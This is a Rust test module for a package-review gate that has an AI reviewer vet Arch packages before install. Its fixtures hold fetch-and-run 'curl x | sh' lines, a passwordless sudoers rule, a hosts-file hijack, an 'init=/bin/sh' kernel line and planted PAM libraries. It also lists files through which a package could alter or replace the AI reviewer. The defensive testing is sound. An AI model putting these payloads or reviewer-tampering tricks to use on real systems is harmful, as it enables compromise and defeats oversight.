                    Some("Guardian's reviewer"),
                    "{key} {reviewer}"
                );
                assert_eq!(
                    claims(&info, "x", SourceClass::LocalPackage, &[]),
                    Some("Guardian's reviewer")
                );
                // A package that may ship the reviewer may also stand in
                // for it: an official one, or one the system trusts.
                assert_eq!(claims(&info, "x", SourceClass::Official, &[]), None);
                assert_eq!(claims(&info, "x", third, &["x".to_string()]), None);
            }
        }
        // A trusted reviewer package is not replaced by a stranger either.
        let trusted = ["opencode-bin".to_string()];
        assert_eq!(
            claims("conflict = opencode-bin\n", "x", third, &trusted),
            Some("Guardian's reviewer")
        );
        assert_eq!(
            claims(
                "provides = opencode\nconflict = opencode\n",
                "opencode-bin",
                third,
                &trusted
            ),
            None
        );
        // A package provides itself, and other names are nobody's business.
        assert_eq!(
            claims(
                "provides = omarchy-guardian=1\n",
                "omarchy-guardian",
                third,
                &[]
            ),
            None
        );
        assert_eq!(
            claims(
                "provides = libfoo.so=1\nconflict = foo-git\n",
                "x",
                third,
                &[]
            ),
            None
        );
        assert_eq!(
            claims(
                "depend = opencode\noptdepend = claude-code\n",
                "x",
                third,
                &[]
            ),
            None
        );
    }

    #[test]
    fn a_package_of_guardians_name_must_be_guardian() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-guardian-name");
        let refused = |archive: &Path, name: &str, class| {
            review(&Archive::open(archive).unwrap(), name, class, &[])
                .err()
                .map(|error| error.to_string())
                .unwrap_or_default()
        };
        // An empty "upgrade" from a third-party repository, or from
        // anywhere: installing it deletes the gate.
        let empty = pack(dir.path(), "omarchy-guardian", "pkgver = 99-1\n", None, &[]);
        let error = refused(&empty, "omarchy-guardian", SourceClass::ThirdPartyRepo);
        assert!(error.contains("third-party repository"), "{error}");
        for class in [SourceClass::LocalPackage, SourceClass::Official] {
            let error = refused(&empty, "omarchy-guardian", class);
            assert!(
                error.contains("does not ship /usr/bin/omarchy-guardian"),
                "{error}"
            );
        }
        let sub = TempDir::new("payload-guardian-name-full");
        let whole = pack(
            sub.path(),
            "omarchy-guardian",
            "",
            None,
            &[
                ("usr/bin/omarchy-guardian", ELF),
                (
                    "usr/lib/omarchy-guardian/guardian-pacman-hook",
                    b"#!/bin/sh\n",
                ),
            ],
        );
        assert_eq!(
            refused(&whole, "omarchy-guardian", SourceClass::LocalPackage),
            ""
        );
        let error = refused(&whole, "omarchy-guardian", SourceClass::ThirdPartyRepo);
        assert!(error.contains("third-party repository"), "{error}");

        // A reviewer's name on a package that drops the reviewer.
        let sub = TempDir::new("payload-reviewer-name");
        let hollow = pack(sub.path(), "claude-code", "", None, &[]);
        let error = refused(&hollow, "claude-code", SourceClass::ThirdPartyRepo);
        assert!(
            error.contains("would replace Guardian's reviewer"),
            "{error}"
        );
        assert_eq!(refused(&hollow, "claude-code", SourceClass::Official), "");
        let rival = pack(
            sub.path(),
            "rival",
            "conflict = opencode\n",
            None,
            &[("usr/bin/rival", b"x\n")],
        );
        let error = refused(&rival, "rival", SourceClass::LocalPackage);
        assert!(
            error.contains("remove or stand in for Guardian's reviewer"),
            "{error}"
        );
    }

    #[test]
    fn what_the_reviewer_reads_as_its_instructions_is_nobodys_to_ship() {
        for path in [
            "etc/opencode/opencode.json",
            "etc/claude-code/managed-settings.json",
            "etc/claude-code",
            "usr/AGENTS.md",
            "usr/CLAUDE.md",
            "usr/CONTEXT.md",
            "usr/opencode.json",
            "usr/opencode.jsonc",
            "usr/.opencode/agent/review.md",
            "usr/.claude/settings.json",
            "AGENTS.md",
            "CLAUDE.md",
            "opencode.json",
        ] {
            for (package, class) in [
                ("evil", SourceClass::ThirdPartyRepo),
                ("opencode", SourceClass::Official),
                ("claude-code", SourceClass::Official),
                ("omarchy-guardian", SourceClass::LocalPackage),
            ] {
                assert!(
                    protected_violation(path, package, class, &["evil".to_string()]).is_some(),
                    "{path} from {package}"
                );
            }
        }
        // Elsewhere those names are ordinary files.
        for path in [
            "usr/share/doc/x/AGENTS.md",
            "usr/lib/x/CLAUDE.md",
            "etc/x/opencode.json",
        ] {
            assert!(
                protected_violation(path, "x", SourceClass::ThirdPartyRepo, &[]).is_none(),
                "{path}"
            );
        }
        // The hook libalpm always loads is Guardian's own.
        let hook = "usr/share/libalpm/hooks/omarchy-guardian.hook";
        assert!(protected_violation(hook, "evil", SourceClass::Official, &[]).is_some());
        assert!(
            protected_violation(hook, "omarchy-guardian", SourceClass::LocalPackage, &[]).is_none()
        );
    }

    #[test]
    fn files_the_scriptlet_and_auto_run_files_name_are_reviewed_with_them() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-named");
        let mut image = b"\x89PNG\r\n\x1a\n".to_vec();
        image.extend([0_u8, 1, 2, 3, 0, 0, 0, 13]);
        let archive = pack(
            dir.path(),
            "pkg",
            "",
            Some(
                "post_install() {\n  /usr/lib/pkg/setup.sh\n  pkg-helper --init\n  cat \"$pkgdir/usr/share/pkg/logo.png\"\n}\n",
            ),
            &[
                (
                    "usr/lib/pkg/setup.sh",
                    b"#!/bin/sh\n. /usr/lib/pkg/lib.sh\n",
                ),
                ("usr/lib/pkg/lib.sh", b"curl x | sh\n"),
                ("usr/bin/pkg-helper", ELF),
                ("usr/share/pkg/logo.png", &image),
                (
                    "usr/share/libalpm/hooks/x.hook",
                    b"[Action]\nExec = /usr/bin/sh /usr/share/pkg/run.sh\n",
                ),
                ("usr/share/pkg/run.sh", b"echo hook\n"),
                (
                    "usr/lib/systemd/system/multi-user.target.wants/x.service",
                    b"[Service]\nExecStart=/usr/bin/python /usr/lib/pkg/x.py\n",
                ),
                ("usr/lib/pkg/x.py", b"print('unit')\n"),
                ("etc/profile.d/x.sh", b". /usr/share/pkg/env.sh\n"),
                ("usr/share/pkg/env.sh", b"export X=1\n"),
                (
                    "usr/lib/udev/rules.d/99-x.rules",
                    b"ACTION==\"add\", RUN+=\"/usr/lib/pkg/plug %k\"\n",
                ),
                ("usr/lib/pkg/plug", b"#!/bin/sh\necho plug\n"),
                ("etc/cron.d/x", b"* * * * * root /bin/sh /lib/pkg/cron.sh\n"),
                ("usr/lib/pkg/cron.sh", b"echo cron\n"),
                ("usr/share/pkg/unrelated.sh", b"echo never named\n"),
                ("usr/share/pkg/empty", b""),
            ],
        );
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "pkg", SourceClass::ThirdPartyRepo, &[]).unwrap();
        assert!(reviewed.unfollowed.is_empty(), "{:?}", reviewed.unfollowed);
        let named: Vec<(&str, Vec<&str>)> = reviewed
            .files
            .iter()
            .filter(|file| !file.run_by.is_empty())
            .map(|file| {
                (
                    file.path.as_str(),
                    file.run_by.iter().map(String::as_str).collect(),
                )
            })
            .collect();
        assert_eq!(
            named,
            [
                ("usr/bin/pkg-helper", vec![".INSTALL"]),
                ("usr/lib/pkg/cron.sh", vec!["etc/cron.d/x"]),
                ("usr/lib/pkg/lib.sh", vec!["usr/lib/pkg/setup.sh"]),
                ("usr/lib/pkg/plug", vec!["usr/lib/udev/rules.d/99-x.rules"]),
                ("usr/lib/pkg/setup.sh", vec![".INSTALL"]),
                (
                    "usr/lib/pkg/x.py",
                    vec!["usr/lib/systemd/system/multi-user.target.wants/x.service"]
                ),
                ("usr/share/pkg/env.sh", vec!["etc/profile.d/x.sh"]),
                ("usr/share/pkg/logo.png", vec![".INSTALL"]),
                (
                    "usr/share/pkg/run.sh",
                    vec!["usr/share/libalpm/hooks/x.hook"]
                ),
            ]
        );
        let content = |path: &str| {
            &reviewed
                .files
                .iter()
                .find(|file| file.path == path)
                .unwrap()
                .content
        };
        assert!(
            matches!(content("usr/lib/pkg/setup.sh"), Content::Text(text)
                if text.contains("named in the install scriptlet") && text.contains(". /usr/lib/pkg/lib.sh"))
        );
        assert!(matches!(content("usr/lib/pkg/lib.sh"), Content::Text(text)
                if text.contains("named in /usr/lib/pkg/setup.sh") && text.contains("curl x | sh")));
        // A compiled program and a picture are what they are, not read.
        assert!(
            matches!(content("usr/bin/pkg-helper"), Content::Binary(format) if format.executable())
        );
        assert!(
            matches!(content("usr/share/pkg/logo.png"), Content::Binary(format) if !format.executable())
        );
        // What is read as an auto-run file itself is not listed again.
        assert!(reviewed.read_as_auto_run.contains("etc/cron.d/x"));
        assert!(!reviewed.read_as_auto_run.contains("usr/lib/pkg/cron.sh"));
    }

    #[test]
    fn what_cannot_be_followed_makes_the_review_incomplete() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        // Text too large to review, and a chain longer than is followed.
        let dir = TempDir::new("payload-unfollowed");
        let mut big = b"#!/bin/sh\n".to_vec();
        big.resize(2 * 1024 * 1024 + 1, b'#');
        let mut program = ELF.to_vec();
        program.resize(3 * 1024 * 1024, 0);
        // A chain two longer than is followed: s00 names s01, and so on.
        let names: Vec<String> = (0..super::MAX_NAMED_DEPTH + 2)
            .map(|index| format!("usr/lib/pkg/s{index:02}.sh"))
            .collect();
        let bodies: Vec<Vec<u8>> = (1..=names.len())
            .map(|next| match names.get(next) {
                Some(name) => format!(". /{name}\n").into_bytes(),
                None => b"curl x | sh\n".to_vec(),
            })
            .collect();
        let mut members: Vec<(&str, &[u8])> = vec![
            ("usr/lib/pkg/big.sh", &big),
            ("usr/lib/pkg/large-program", &program),
        ];
        members.extend(
            names
                .iter()
                .zip(&bodies)
                .map(|(name, body)| (name.as_str(), body.as_slice())),
        );
        let archive = pack(
            dir.path(),
            "pkg",
            "",
            Some(
                "post_install() { /usr/lib/pkg/big.sh; /usr/lib/pkg/s00.sh; /usr/lib/pkg/large-program; }\n",
            ),
            &members,
        );
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
        let paths: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        let mut followed: Vec<&str> = names[..super::MAX_NAMED_DEPTH]
            .iter()
            .map(String::as_str)
            .collect();
        followed.insert(0, "usr/lib/pkg/large-program");
        followed.sort_unstable();
        let mut listed = paths.clone();
        listed.sort_unstable();
        assert_eq!(listed, followed);
        // A program of any size is named, never read whole.
        let program = reviewed
            .files
            .iter()
            .find(|file| file.path == "usr/lib/pkg/large-program")
            .unwrap();
        assert!(matches!(program.content, Content::Binary(_)));
        assert_eq!(reviewed.unfollowed.len(), 2, "{:?}", reviewed.unfollowed);
        assert!(
            reviewed.unfollowed[0].contains("/usr/lib/pkg/big.sh")
                && reviewed.unfollowed[0].contains("over the 2 MiB review limit"),
            "{:?}",
            reviewed.unfollowed
        );
        assert!(
            reviewed.unfollowed[1].contains(&format!("/{}", names[super::MAX_NAMED_DEPTH]))
                && reviewed.unfollowed[1].contains("were not followed"),
            "{:?}",
            reviewed.unfollowed
        );
    }

    #[test]
    fn the_first_bytes_of_files_are_read_in_one_pass() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-heads");
        let mut long = vec![b'a'; 20_000];
        long[..4].copy_from_slice(b"head");
        let archive = pack(
            dir.path(),
            "pkg",
            "",
            None,
            &[
                ("usr/share/pkg/one", b"first\n"),
                ("usr/share/pkg/long", &long),
                ("usr/share/pkg/[odd]*name", b"odd\n"),
                ("usr/share/pkg/skipped", b"not asked for\n"),
            ],
        );
        let opened = Archive::open(&archive).unwrap();
        let asked = [
            "usr/share/pkg/[odd]*name".to_string(),
            "usr/share/pkg/long".to_string(),
            "usr/share/pkg/one".to_string(),
        ];
        let heads = opened.heads(&asked).unwrap();
        assert_eq!(heads.len(), 3);
        assert_eq!(heads["usr/share/pkg/one"], b"first\n");
        assert_eq!(heads["usr/share/pkg/[odd]*name"], b"odd\n");
        assert_eq!(
            heads["usr/share/pkg/long"].len(),
            crate::content::PROBE_SIZE
        );
        assert!(heads["usr/share/pkg/long"].starts_with(b"head"));
        assert!(opened.heads(&[]).unwrap().is_empty());
    }

    #[test]
    fn completions_are_reviewed_for_other_than_official_packages_and_misplaced_files_named() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-unofficial");
        let archive = pack(
            dir.path(),
            "pkg",
            "",
            None,
            &[
                (
                    "usr/share/bash-completion/completions/pkg",
                    b"complete -F _pkg pkg\n",
                ),
                ("usr/share/zsh/site-functions/_pkg", b"#compdef pkg\n"),
                (
                    "usr/share/vim/vimfiles/plugin/pkg.vim",
                    b"autocmd VimEnter * echo 1\n",
                ),
                (
                    "usr/local/lib/systemd/system/sshd.service",
                    b"[Service]\nExecStart=/usr/bin/x\n",
                ),
                (
                    "usr/share/systemd/user/pipewire.service",
                    b"[Service]\nExecStart=/usr/bin/y\n",
                ),
                ("etc/skel/.bashrc", b"alias ls=ls\n"),
                ("etc/skel/.config/app/data.json", b"{}\n"),
                ("usr/lib/security/pam_pkg.so", ELF),
                ("usr/lib/glibc-hwcaps/x86-64-v3/libc.so.6", ELF),
                ("etc/kernel/cmdline", b"quiet init=/bin/sh\n"),
                ("etc/hosts", b"203.0.113.7 archlinux.org\n"),
                ("var/lib/flatpak/overrides/global", b"[Context]\n"),
                (
                    "etc/ca-certificates/trust-source/anchors/x.crt",
                    b"-----BEGIN CERTIFICATE-----\n",
                ),
                ("etc/tmux.conf", b"run-shell /usr/bin/x\n"),
            ],
        );
        let opened = Archive::open(&archive).unwrap();
        let paths = |class| {
            let reviewed = review(&opened, "pkg", class, &[]).unwrap();
            let paths: Vec<String> = reviewed.files.into_iter().map(|file| file.path).collect();
            (paths, reviewed.misplaced)
        };
        let (third, misplaced) = paths(SourceClass::ThirdPartyRepo);
        assert_eq!(
            third,
            [
                // Reviewed, so not also called unreviewed below.
                "etc/ca-certificates/trust-source/anchors/x.crt",
                "etc/skel/.bashrc",
                "etc/tmux.conf",
                "usr/local/lib/systemd/system/sshd.service",
                "usr/share/bash-completion/completions/pkg",
                "usr/share/systemd/user/pipewire.service",
                "usr/share/vim/vimfiles/plugin/pkg.vim",
                "usr/share/zsh/site-functions/_pkg",
            ]
        );
        let misplaced: Vec<(&str, &str)> = misplaced
            .iter()
            .map(|(path, when)| (path.as_str(), *when))
            .collect();
        assert_eq!(
            misplaced,
            [
                // By path, whatever order the archive lists them in.
                (
                    "etc/hosts",
                    "decides which address a name leads to, without asking DNS"
                ),
                ("etc/kernel/cmdline", "runs before the system starts"),
                (
                    "usr/lib/glibc-hwcaps/x86-64-v3/libc.so.6",
                    "applies to every program started"
                ),
                ("usr/lib/security/pam_pkg.so", "runs when someone logs in"),
                (
                    "var/lib/flatpak/overrides/global",
                    "decides what every Flatpak app may reach outside its sandbox"
                ),
            ]
        );

        let (official, misplaced) = paths(SourceClass::Official);
        assert_eq!(
            official,
            [
                "etc/ca-certificates/trust-source/anchors/x.crt",
                "etc/skel/.bashrc",
                "etc/tmux.conf",
                "usr/local/lib/systemd/system/sshd.service",
                "usr/share/systemd/user/pipewire.service",
                "usr/share/vim/vimfiles/plugin/pkg.vim",
            ]
        );
        assert!(misplaced.is_empty());
    }

    #[test]
    fn an_archive_rewritten_in_place_no_longer_matches_its_fingerprint() {
        use std::io::{Seek, SeekFrom, Write};
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-fingerprint");
        let archive = pack(dir.path(), "pkg", "", None, &[("usr/bin/pkg", b"one\n")]);
        let opened = Archive::open(&archive).unwrap();
        let fingerprint = opened.fingerprint().unwrap();
        assert_eq!(
            *fingerprint.digest(),
            crate::sha256::Sha256::digest(&fs::read(&archive).unwrap())
        );
        assert!(fingerprint.rehash);
        assert_eq!(fingerprint.name(), "pkg-1-1-any");
        fingerprint.verify().unwrap();
        // Only a file nobody but root can touch is not hashed a second time.
        assert!(!super::root_alone(
            &archive,
            &fs::metadata(&archive).unwrap()
        ));
        let system = Path::new("/usr/bin/bsdtar");
        let metadata = fs::metadata(system).unwrap();
        if std::os::unix::fs::MetadataExt::uid(&metadata) == 0 {
            assert!(super::root_alone(system, &metadata));
            assert!(!super::root_alone(Path::new("usr/bin/bsdtar"), &metadata));
        }

        // The same file, the same bytes, but not what was hashed.
        let forged = super::Fingerprint {
            digest: crate::sha256::Sha256::digest(b"something else"),
            ..fingerprint.clone()
        };
        assert!(forged.verify().is_err());

        // Rewritten in place: same inode, same size, other bytes.
        let before = fs::metadata(&archive).unwrap();
        let mut file = fs::OpenOptions::new().write(true).open(&archive).unwrap();
        file.seek(SeekFrom::Start(600)).unwrap();
        file.write_all(b"two\n").unwrap();
        file.sync_all().unwrap();
        file.set_modified(before.modified().unwrap()).unwrap();
        drop(file);
        let after = fs::metadata(&archive).unwrap();
        assert_eq!(before.len(), after.len());
        assert_eq!(before.modified().unwrap(), after.modified().unwrap());
        let error = fingerprint.verify().unwrap_err().to_string();
        assert!(
            error.contains("changed while it was being reviewed"),
            "{error}"
        );
        // The kernel's change time alone gives it away, hash aside.
        assert!(opened.verify_unchanged().is_err());

        // A file swapped in under the same name is another file.
        let other = TempDir::new("payload-fingerprint-swap");
        let archive = pack(other.path(), "pkg", "", None, &[("usr/bin/pkg", b"one\n")]);
        let fingerprint = Archive::open(&archive).unwrap().fingerprint().unwrap();
        let copy = other.path().join("copy");
        fs::copy(&archive, &copy).unwrap();
        fs::rename(&copy, &archive).unwrap();
        assert!(fingerprint.verify().is_err());
    }

    #[test]
    fn what_a_package_puts_where_a_link_leads() {
        use super::Replacement;
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-replacement");
        let mut program = ELF.to_vec();
        program.resize(3 * 1024 * 1024, 0);
        let mut text = b"ALL ALL=(ALL) ALL\n".to_vec();
        text.resize(2 * 1024 * 1024 + 1, b'#');
        let archive = pack(
            dir.path(),
            "pkg",
            "",
            None,
            &[
                ("usr/share/pkg/rule", b"ALL ALL=(ALL) NOPASSWD: ALL\n"),
                ("usr/share/pkg/program", &program),
                ("usr/share/pkg/long-rule", &text),
            ],
        );
        let opened = Archive::open(&archive).unwrap();
        assert_eq!(
            opened.replacement("usr/share/pkg/rule"),
            Some(Replacement::File(b"ALL ALL=(ALL) NOPASSWD: ALL\n".to_vec()))
        );
        assert_eq!(
            opened.replacement("usr/share/pkg/program"),
            Some(Replacement::Binary("ELF executable"))
        );
        assert_eq!(
            opened.replacement("usr/share/pkg/long-rule"),
            Some(Replacement::TooLarge)
        );
        assert_eq!(opened.replacement("usr/share/pkg"), None);
        assert_eq!(opened.replacement("usr/share/other/rule"), None);
        assert_eq!(super::through_root_links("sbin/x"), "usr/bin/x");
        assert_eq!(super::through_root_links("usr/lib64/x/y"), "usr/lib/x/y");
        assert_eq!(super::through_root_links("usr/share/x"), "usr/share/x");
    }

    #[test]
    fn no_sweep_only_place_is_said_to_be_what_it_is_not() {
        // No Flatpak override is an app launcher, and a table the system
        // is set up by (or a quadlet) is not a program that runs.
        for location in crate::autorun::SYSTEM_SWEEP {
            let effect = super::sweep_only_effect(location);
            assert!(!effect.contains("open the app"), "{}", location.path);
            let table = matches!(
                location.path,
                "etc/fstab" | "etc/crypttab" | "etc/hosts" | "etc/containers/systemd/"
            );
            assert!(
                !table || !effect.starts_with("runs"),
                "{}: {effect}",
                location.path
            );
        }
    }

    #[test]
    fn a_named_path_is_followed_as_the_system_walks_it() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-walked");
        let root = dir.path().join("pkg-root");
        for directory in ["usr/share/pkg", "usr/lib/pkg", "opt/pkg/releases/1"] {
            fs::create_dir_all(root.join(directory)).unwrap();
        }
        fs::write(root.join(".PKGINFO"), "pkgname = pkg\n").unwrap();
        fs::write(
            root.join(".INSTALL"),
            "post_install() {\n  sh /usr/lib/../share/pkg/dots.sh\n  sh /lib/../share/pkg//slashes.sh\n  /opt/pkg/current/run.sh\n  /opt/pkg/again/run2.sh\n  sh $dir/var.sh /usr/lib/pkg/../../../../etc/above.sh\n}\n",
        )
        .unwrap();
        for file in ["dots.sh", "slashes.sh", "var.sh", "above.sh"] {
            fs::write(root.join("usr/share/pkg").join(file), "echo x\n").unwrap();
        }
        fs::write(root.join("opt/pkg/releases/1/run.sh"), "echo run\n").unwrap();
        fs::write(root.join("opt/pkg/releases/1/run2.sh"), "echo run\n").unwrap();
        // A directory link the package ships, and one that leads to it.
        symlink("releases/1", root.join("opt/pkg/current")).unwrap();
        symlink("/opt/pkg/current", root.join("opt/pkg/again")).unwrap();
        // Links in a circle lead nowhere, and end.
        symlink("b", root.join("opt/pkg/a")).unwrap();
        symlink("a", root.join("opt/pkg/b")).unwrap();
        let archive = dir.path().join("pkg-1-1-any.pkg.tar");
        build(
            &root,
            &archive,
            &[".PKGINFO", ".INSTALL", "usr", "opt"],
            &["--uid", "0", "--gid", "0"],
        );
        let opened = Archive::open(&archive).unwrap();
        assert_eq!(
            opened.walked("usr/lib/../share/x").as_deref(),
            Some("usr/share/x")
        );
        // `/lib` is `usr/lib`, so the step back from it ends in `/usr`.
        assert_eq!(
            opened.walked("lib/../share/x").as_deref(),
            Some("usr/share/x")
        );
        assert_eq!(
            opened.walked("opt/pkg/again/x").as_deref(),
            Some("opt/pkg/releases/1/x")
        );
        assert_eq!(opened.walked("usr/../../etc/x"), None);
        assert_eq!(opened.walked("opt/pkg/a/x"), None);

        let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
        let named: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        // A path behind a variable and one above the root are not found.
        assert_eq!(
            named,
            [
                "opt/pkg/releases/1/run.sh",
                "opt/pkg/releases/1/run2.sh",
                "usr/share/pkg/dots.sh",
                "usr/share/pkg/slashes.sh",
            ]
        );
    }

    #[test]
    fn what_is_over_a_limit_is_left_unread_and_a_refusal_still_refuses() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-unread");
        let mut big = b"#!/bin/sh\n".to_vec();
        big.resize(2 * 1024 * 1024 + 1, b'#');
        let script = String::from_utf8(big.clone()).unwrap();
        let files: &[(&str, &[u8])] = &[
            ("etc/profile.d/big.sh", &big),
            ("etc/profile.d/small.sh", b"export X=1\n"),
        ];
        let archive = pack(dir.path(), "pkg", "", Some(&script), files);
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
        assert!(reviewed.install.is_none());
        let read: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(read, ["etc/profile.d/small.sh"]);
        assert_eq!(
            reviewed.unfollowed,
            [
                "the install scriptlet exceeds the 2 MiB review limit",
                "auto-run file /etc/profile.d/big.sh exceeds the 2 MiB review limit"
            ]
        );

        // The same package claiming Guardian's place is refused all the
        // same: what is unread does not come before what is refused.
        let claiming = TempDir::new("payload-unread-claim");
        let archive = pack(
            claiming.path(),
            "pkg",
            "replaces = omarchy-guardian\n",
            Some(&script),
            files,
        );
        let opened = Archive::open(&archive).unwrap();
        assert!(review(&opened, "pkg", SourceClass::LocalPackage, &[]).is_err());
    }
}
